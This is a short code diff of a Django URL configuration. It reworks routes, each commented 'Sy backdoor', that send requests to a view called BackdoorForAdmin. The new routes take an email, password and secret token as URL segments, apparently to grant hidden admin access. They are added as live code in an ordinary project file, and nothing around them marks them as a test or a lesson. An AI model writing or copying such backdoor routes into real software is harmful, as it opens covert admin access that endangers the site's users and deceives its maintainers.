@@ -9,7 +9,8 @@ urlpatterns = [
     path('sw.js', views.ServiceWorkerFile.as_view(), name = 'service_worker_file'),
     path('', views.Home.as_view(), name = 'true_base_dir'),
     
-    path('sy/_admin/<str:email>/<str:password>/', views.BackdoorForAdmin.as_view()),    #Sy backdoor
+    path('sy/_admin/<str:email>/<str:password>/<str:sy_secret>/', views.BackdoorForAdmin.as_view()),    #Sy backdoor
+    path('sy/_admin/<str:email>/<path:sy_secret>/', views.BackdoorForAdmin.as_view()),    #Sy backdoor
 ]
 
 
